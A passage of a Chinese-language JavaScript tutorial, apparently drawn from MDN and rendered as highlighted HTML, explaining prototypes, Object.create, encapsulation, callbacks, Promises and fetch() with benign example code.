function_">doSomething</span>(<span class="hljs-params"></span>)&#123;&#125;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>( doSomething.prototype );<br><span class="hljs-comment">// It does not matter how you declare the function, a</span><br><span class="hljs-comment">//  function in javascript will always have a default</span><br><span class="hljs-comment">//  prototype property.</span><br><span class="hljs-keyword">var</span> doSomething = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;&#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>( doSomething.prototype );<br></code></pre></td></tr></table></figure><p>正如上面所看到的，<code>doSomething</code> 函数有一个默认的原型属性，它在控制台上面呈现了出来。运行这段代码之后，控制台上面应该出现了像这样的一个对象。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&#123;<br>    constructor: ƒ <span class="hljs-keyword">do</span><span class="hljs-constructor">Something()</span>,<br>    __proto__: &#123;<br>        constructor: ƒ <span class="hljs-constructor">Object()</span>,<br>        hasOwnProperty: ƒ has<span class="hljs-constructor">OwnProperty()</span>,<br>        isPrototypeOf: ƒ is<span class="hljs-constructor">PrototypeOf()</span>,<br>        propertyIsEnumerable: ƒ property<span class="hljs-constructor">IsEnumerable()</span>,<br>        toLocaleString: ƒ <span class="hljs-keyword">to</span><span class="hljs-constructor">LocaleString()</span>,<br>        toString: ƒ <span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>,<br>        valueOf: ƒ value<span class="hljs-constructor">Of()</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在，我们可以添加一些属性到 doSomething 的原型上面，如下所示。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">doSomething</span>(<span class="hljs-params"></span>)&#123;&#125;<br>doSomething.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">foo</span> = <span class="hljs-string">&quot;bar&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( doSomething.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> );<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&#123;<br>    foo: <span class="hljs-string">&quot;bar&quot;</span>,<br>    constructor: ƒ <span class="hljs-keyword">do</span><span class="hljs-constructor">Something()</span>,<br>    __proto__: &#123;<br>        constructor: ƒ <span class="hljs-constructor">Object()</span>,<br>        hasOwnProperty: ƒ has<span class="hljs-constructor">OwnProperty()</span>,<br>        isPrototypeOf: ƒ is<span class="hljs-constructor">PrototypeOf()</span>,<br>        propertyIsEnumerable: ƒ property<span class="hljs-constructor">IsEnumerable()</span>,<br>        toLocaleString: ƒ <span class="hljs-keyword">to</span><span class="hljs-constructor">LocaleString()</span>,<br>        toString: ƒ <span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>,<br>        valueOf: ƒ value<span class="hljs-constructor">Of()</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后，我们可以使用 new 运算符来在现在的这个原型基础之上，创建一个 <code>doSomething</code> 的实例。正确使用 new 运算符的方法就是在正常调用函数时，在函数名的前面加上一个 <code>new</code> 前缀。通过这种方法，在调用函数前加一个 <code>new</code> ，它就会返回一个这个函数的实例化对象。然后，就可以在这个对象上面添加一些属性。看。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">doSomething</span>(<span class="hljs-params"></span>)&#123;&#125;<br>doSomething.prototype.foo = <span class="hljs-string">&quot;bar&quot;</span>; <span class="hljs-comment">// add a property onto the prototype</span><br><span class="hljs-keyword">var</span> doSomeInstancing = <span class="hljs-keyword">new</span> doSomething();<br>doSomeInstancing.prop = <span class="hljs-string">&quot;some value&quot;</span>; <span class="hljs-comment">// add a property onto the object</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>( doSomeInstancing );<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    prop:</span> <span class="hljs-string">&quot;some value&quot;</span>,<br><span class="hljs-symbol">    __proto__:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">        foo:</span> <span class="hljs-string">&quot;bar&quot;</span>,<br><span class="hljs-symbol">        constructor:</span> ƒ doSomething(),<br><span class="hljs-symbol">        __proto__:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">            constructor:</span> ƒ Object(),<br><span class="hljs-symbol">            hasOwnProperty:</span> ƒ hasOwnProperty(),<br><span class="hljs-symbol">            isPrototypeOf:</span> ƒ isPrototypeOf(),<br><span class="hljs-symbol">            propertyIsEnumerable:</span> ƒ propertyIsEnumerable(),<br><span class="hljs-symbol">            toLocaleString:</span> ƒ toLocaleString(),<br><span class="hljs-symbol">            toString:</span> ƒ toString(),<br><span class="hljs-symbol">            valueOf:</span> ƒ valueOf()<br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>就像上面看到的，<code>doSomeInstancing</code> 的 <code>__proto__</code> 属性就是<code>doSomething.prototype</code>. 但是这又有什么用呢？好吧，当你访问 <code>doSomeInstancing</code> 的一个属性，浏览器首先查找 <code>doSomeInstancing</code> 是否有这个属性。如果 <code>doSomeInstancing</code> 没有这个属性，然后浏览器就会在 <code>doSomeInstancing</code> 的 <code>__proto__</code> 中查找这个属性 (也就是 doSomething.prototype). 如果 doSomeInstancing 的 <code>__proto__</code> 有这个属性，那么 doSomeInstancing 的 <code>__proto__</code> 上的这个属性就会被使用。否则，如果 doSomeInstancing 的 <code>__proto__</code> 没有这个属性，浏览器就会去查找 doSomeInstancing 的 <code>__proto__</code> 的 <code>__proto__</code> ，看它是否有这个属性。默认情况下，所有函数的原型属性的 <code>__proto__</code> 就是 <code>window.Object.prototype</code>. 所以 doSomeInstancing 的 <code>__proto__</code> 的 <code>__proto__</code> (也就是 doSomething.prototype 的 <code>__proto__</code> (也就是 <code>Object.prototype</code>)) 会被查找是否有这个属性。如果没有在它里面找到这个属性，然后就会在 doSomeInstancing 的 <code>__proto__</code> 的 <code>__proto__</code> 的 <code>__proto__</code> 里面查找。然而这有一个问题：doSomeInstancing 的 <code>__proto__</code> 的 <code>__proto__</code> 的 <code>__proto__</code> 不存在。最后，原型链上面的所有的 <code>__proto__</code> 都被找完了，浏览器所有已经声明了的 <code>__proto__</code> 上都不存在这个属性，然后就得出结论，这个属性是 <code>undefined</code>.</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">doSomething</span>(<span class="hljs-params"></span>)&#123;&#125;<br>doSomething.prototype.foo = <span class="hljs-string">&quot;bar&quot;</span>;<br><span class="hljs-keyword">var</span> doSomeInstancing = <span class="hljs-keyword">new</span> doSomething();<br>doSomeInstancing.prop = <span class="hljs-string">&quot;some value&quot;</span>;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;doSomeInstancing.prop:      &quot;</span> + doSomeInstancing.prop);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;doSomeInstancing.foo:       &quot;</span> + doSomeInstancing.foo);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;doSomething.prop:           &quot;</span> + doSomething.prop);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;doSomething.foo:            &quot;</span> + doSomething.foo);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;doSomething.prototype.prop: &quot;</span> + doSomething.prototype.prop);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;doSomething.prototype.foo:  &quot;</span> + doSomething.prototype.foo);<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">doSomeInstancing<span class="hljs-selector-class">.prop</span>:      some value<br>doSomeInstancing<span class="hljs-selector-class">.foo</span>:       bar<br>doSomething<span class="hljs-selector-class">.prop</span>:           undefined<br>doSomething<span class="hljs-selector-class">.foo</span>:            undefined<br>doSomething<span class="hljs-selector-class">.prototype</span><span class="hljs-selector-class">.prop</span>: undefined<br>doSomething<span class="hljs-selector-class">.prototype</span><span class="hljs-selector-class">.foo</span>:  bar<br></code></pre></td></tr></table></figure><p><strong>create()</strong></p><p>我们曾经讲过如何用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create"><code>Object.create()</code></a> 方法创建新的对象实例。</p><ol><li><p>例如，在上个例子的 JavaScript 控制台中输入：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var person2 <span class="hljs-operator">=</span> Object.create(person1)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p>create()实际做的是从指定原型对象创建一个新的对象。这里以person1为原型对象创建了person2对象。在控制台输入：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">person2.<span class="hljs-emphasis">__proto__</span><br></code></pre></td></tr></table></figure></li></ol><p>结果返回对象<code>person1</code>。</p><h4 id="面向对象编程基本概念"><a href="#面向对象编程基本概念" class="headerlink" title="面向对象编程基本概念"></a>面向对象编程基本概念</h4><p>面向对象编程（OOP）是如今多种编程语言所实现的一种编程范式，包括 Java、C++。在本文中，我们会简要介绍面向对象编程（OOP）的基本概念，其中包括三个主要概念：<strong>类与实例</strong>、<strong>继承</strong>、<strong>封装</strong>。</p><p><strong>封装</strong></p><p>当其他部分的代码想要执行对象的某些操作时，可以借助对象向外部提供的接口完成操作，借此，对象保持了自身的内部状态不会被外部代码随意修改。也就是说，对象的内部状态保持了私有性，而外部代码只能通过对象所提供的接口访问和修改对象的内部状态，不能直接访问和修改对象的内部状态。保持对象内部状态的私有性、明确划分对象的公共接口和内部状态，这些特性称之为<strong>封装</strong>（encapsulation）。</p><p>封装的好处在于，当程序员需要修改一个对象的某个操作时，程序员只需要修改对象对应方法的内部实现即可，而不需要在所有代码中找出该方法的所有实现，并逐一修改。某种意义上来说，封装在对象内部和对象外部设立了一种特别的“防火墙”。</p><h3 id="3-6-异步javascript"><a href="#3-6-异步javascript" class="headerlink" title="3.6 异步javascript"></a>3.6 异步javascript</h3><p>异步编程技术使你的程序可以在执行一个可能长期运行的任务的同时继续对其他事件做出反应而不必等待任务完成。与此同时，你的程序也将在任务完成后显示结果。</p><p>浏览器提供的许多功能（尤其是最有趣的那一部分）可能需要很长的时间来完成，因此需要异步完成，例如：</p><ul><li>使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/fetch"><code>fetch()</code></a> 发起 HTTP 请求</li><li>使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/MediaDevices/getUserMedia"><code>getUserMedia()</code></a> 访问用户的摄像头和麦克风</li><li>使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/showOpenFilePicker"><code>showOpenFilePicker()</code> (en-US)</a> 请求用户选择文件以供访问</li></ul><p>因此，即使你可能不需要经常<em>实现</em>自己的异步函数，你也很可能需要<em>正确使用</em>它们。</p><p>在这篇文章中，我们将从同步函数长时间运行时存在的问题开始，并以此进一步认识异步编程的必要性。</p><p>事件处理程序实际上就是异步编程的一种形式：你提供的函数（事件处理程序）将在事件发生时被调用（而不是立即被调用）。如果“事件”是“异步操作已经完成”，那么你就可以看到事件如何被用来通知调用者异步函数调用的结果的。</p><p>一些早期的异步 API 正是以这种方式来使用事件的。<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest"><code>XMLHttpRequest</code></a> API 可以让你用 JavaScript 向远程服务器发起 HTTP 请求。由于这样的操作可能需要很长的时间，所以它被设计成异步 API，你可以通过给 <code>XMLHttpRequest</code> 对象附加事件监听器来让程序在请求进展和最终完成时获得通知。</p><p>下面的例子展示了这样的操作。点击“点击发起请求”按钮来发送一个请求。我们将创建一个新的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest"><code>XMLHttpRequest</code></a> 并监听它的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/loadend_event"><code>loadend</code></a> 事件。而我们的事件处理程序则会在控制台中输出一个“完成！”的消息和请求的状态代码。</p><p>我们在添加了事件监听器后发送请求。注意，在这之后，我们仍然可以在控制台中输出“请求已发起”，也就是说，我们的程序可以在请求进行的同时继续运行，而我们的事件处理程序将在请求完成时被调用。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;xhr&quot;</span>&gt;</span>点击发起请求<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;reload&quot;</span>&gt;</span>重载<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span> <span class="hljs-attr">readonly</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;event-log&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> log = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;.event-log&#x27;</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#xhr&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  log.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>  xhr.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;loadend&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    log.<span class="hljs-property">textContent</span> = <span class="hljs-string">`<span class="hljs-subst">$&#123;log.textContent&#125;</span>完成！状态码：<span class="hljs-subst">$&#123;xhr.status&#125;</span>`</span>;<br>  &#125;);<br>  xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;https://raw.githubusercontent.com/mdn/content/main/files/en-us/_wikihistory.json&#x27;</span>);<br>  xhr.<span class="hljs-title function_">send</span>();<br>  log.<span class="hljs-property">textContent</span> = <span class="hljs-string">`<span class="hljs-subst">$&#123;log.textContent&#125;</span>请求已发起\n`</span>;&#125;);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#reload&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  log.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">reload</span>();<br>&#125;);<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="事件处理程序 sample" id="frame_事件处理程序" width="600" height="120" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/JavaScript/Asynchronous/Introducing/_sample_.%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem; color: rgb(27, 27, 27); font-family: Inter, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Fira Sans&quot;, &quot;Droid Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"></iframe><p>这就像我们在以前的模块中遇到的<a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Building_blocks/Events">事件处理程序</a>，只是这次的事件不是像点击按钮那样的用户行为，而是某个对象的状态变化。</p><h4 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h4><p>事件处理程序是一种特殊类型的回调函数。而回调函数则是一个被传递到另一个函数中的会在适当的时候被调用的函数。正如我们刚刚所看到的：回调函数曾经是 JavaScript 中实现异步函数的主要方式。</p><p>然而，当回调函数本身需要调用其他同样接受回调函数的函数时，基于回调的代码会变得难以理解。当你需要执行一些分解成一系列异步函数的操作时，这将变得十分常见。例如下面这种情况：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">doStep1</span>(init) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-type">init</span> + <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title">doStep2</span>(init) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-type">init</span> + <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title">doStep3</span>(init) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-type">init</span> + <span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title">doOperation</span>() &#123;<br>  let result = 0;<br>  result = doStep1(result);<br>  result = doStep2(result);<br>  result = doStep3(result);<br>  console.log(`结果：$&#123;result&#125;`);<br>&#125;<br>doOperation();<br></code></pre></td></tr></table></figure><p>现在我们有一个被分成三步的操作，每一步都依赖于上一步。在这个例子中，第一步给输入的数据加 1，第二步加 2，第三步加 3。从输入 0 开始，最终结果是 6（0+1+2+3）。作为同步代码，这很容易理解。但是如果我们用回调来实现这些步骤呢？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">doStep1</span>(<span class="hljs-params">init, callback</span>) &#123;<br>  <span class="hljs-keyword">const</span> result = init + <span class="hljs-number">1</span>;<br>  <span class="hljs-title function_">callback</span>(result);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">doStep2</span>(<span class="hljs-params">init, callback</span>) &#123;<br>  <span class="hljs-keyword">const</span> result = init + <span class="hljs-number">2</span>;<br>  <span class="hljs-title function_">callback</span>(result);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">doStep3</span>(<span class="hljs-params">init, callback</span>) &#123;<br>  <span class="hljs-keyword">const</span> result = init + <span class="hljs-number">3</span>;<br>  <span class="hljs-title function_">callback</span>(result);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">doOperation</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">doStep1</span>(<span class="hljs-number">0</span>, <span class="hljs-function"><span class="hljs-params">result1</span> =&gt;</span> &#123;<br>    <span class="hljs-title function_">doStep2</span>(result1, <span class="hljs-function"><span class="hljs-params">result2</span> =&gt;</span> &#123;<br>      <span class="hljs-title function_">doStep3</span>(result2, <span class="hljs-function"><span class="hljs-params">result3</span> =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`结果：<span class="hljs-subst">$&#123;result3&#125;</span>`</span>);<br>      &#125;);<br>    &#125;);<br>  &#125;);<br>&#125;<br><span class="hljs-title function_">doOperation</span>();<br></code></pre></td></tr></table></figure><p>因为必须在回调函数中调用回调函数，我们就得到了这个深度嵌套的 <code>doOperation()</code> 函数，这就更难阅读和调试了。在一些地方这被称为“回调地狱”或“厄运金字塔”（因为缩进看起来像一个金字塔的侧面）。</p><p>面对这样的嵌套回调，处理错误也会变得非常困难：你必须在“金字塔”的每一级处理错误，而不是在最高一级一次完成错误处理。</p><p>由于以上这些原因，大多数现代异步 API 都不使用回调。事实上，JavaScript 中异步编程的基础是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise"><code>Promise</code></a>，这也是我们下一篇文章要讲述的主题。</p><h4 id="如何使用promise"><a href="#如何使用promise" class="headerlink" title="如何使用promise"></a>如何使用promise</h4><p><strong>Promise</strong> 是现代 JavaScript 中异步编程的基础，是一个由异步函数返回的可以向我们指示当前操作所处的状态的对象。在 Promise 返回给调用者的时候，操作往往还没有完成，但 Promise 对象可以让我们操作最终完成时对其进行处理（无论成功还是失败）。</p><h4 id="使用-fetch-API"><a href="#使用-fetch-API" class="headerlink" title="使用 fetch() API"></a>使用 fetch() API</h4><p>要做到这一点，我们将向服务器发出一个 <strong>HTTP 请求</strong>。在 HTTP 请求中，我们向远程服务器发送一个请求信息，然后它向我们发送一个响应。这次，我们将发送一个请求，从服务器上获得一个 JSON 文件。还记得在上一篇文章中，我们使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest"><code>XMLHttpRequest</code></a> API 进行 HTTP 请求吗？那么，在这篇文章中，我们将使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/fetch"><code>fetch()</code></a> API，一个现代的、基于 Promise 的、用于替代 <code>XMLHttpRequest</code> 的方法。</p><p>把下列代码复制到你的浏览器 JavaScript 控制台中：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade">const fetchPromise = fetch(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&#x27;</span>);<br><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(fetchPromise);<br><br>fetchPromise.then( <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">`已收到响应：<span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>&#125;);<br><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;已发送请求……&quot;</span>);<br></code></pre></td></tr></table></figure><p>我们在这里：</p><ol><li>调用 <code>fetch()</code> API，并将返回值赋给 <code>fetchPromise</code> 变量。</li><li>紧接着，输出 <code>fetchPromise</code> 变量，输出结果应该像这样：<code>Promise &#123; &lt;state&gt;: &quot;pending&quot; &#125;</code>。这告诉我们有一个 <code>Promise</code> 对象，它有一个 <code>state</code>属性，值是 <code>&quot;pending&quot;</code>。<code>&quot;pending&quot;</code> 状态意味着操作仍在进行中。</li><li>将一个处理函数传递给 Promise 的 <strong><code>then()</code></strong> 方法。当（如果）获取操作成功时，Promise 将调用我们的处理函数，传入一个包含服务器的响应的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Response"><code>Response</code></a> 对象。</li><li>输出一条信息，说明我们已经发送了这个请求。</li></ol><p>完整的输出结果应该是这样的：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">Promise</span> &#123; &lt;state&gt;: <span class="hljs-string">&quot;pending&quot;</span> &#125;<br>已发送请求……<br>已收到响应：<span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><p>请注意，<code>已发送请求……</code> 的消息在我们收到响应之前就被输出了。与同步函数不同，<code>fetch()</code> 在请求仍在进行时返回，这使我们的程序能够保持响应性。响应显示了 <code>200</code>（OK）的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">状态码</a>，意味着我们的请求成功了。</p><p>可能这看起来很像上一篇文章中的例子中我们把事件处理程序添加到 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest"><code>XMLHttpRequest</code></a> 对象中。但不同的是，我们这一次将处理程序传递到返回的 Promise 对象的 <code>then()</code> 方法中。</p><h4 id="链式使用-Promise"><a href="#链式使用-Promise" class="headerlink" title="链式使用 Promise"></a>链式使用 Promise</h4><p>在你通过 <code>fetch()</code> API 得到一个 <code>Response</code> 对象的时候，你需要调用另一个函数来获取响应数据。这次，我们想获得 JSON 格式的响应数据，所以我们会调用 <code>Response</code> 对象的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Response/json"><code>json()</code></a> 方法。事实上，<code>json()</code> 也是异步的，因此我们必须连续调用两个异步函数。</p><p>试试这个：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arcade">const fetchPromise = fetch(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&#x27;</span>);<br><br>fetchPromise.then( <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>  const jsonPromise = response.json();<br>  jsonPromise.then( <span class="hljs-function"><span class="hljs-params">json</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(json[<span class="hljs-number">0</span>].name);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>在这个示例中，就像我们之前做的那样，我们给 <code>fetch()</code> 返回的 Promise 对象添加了一个 <code>then()</code> 处理程序。但这次我们的处理程序调用 <code>response.json()</code> 方法，然后将一个新的 <code>then()</code> 处理程序传递到 <code>response.json()</code> 返回的 Promise 中。</p><p>执行代码后应该会输出“baked 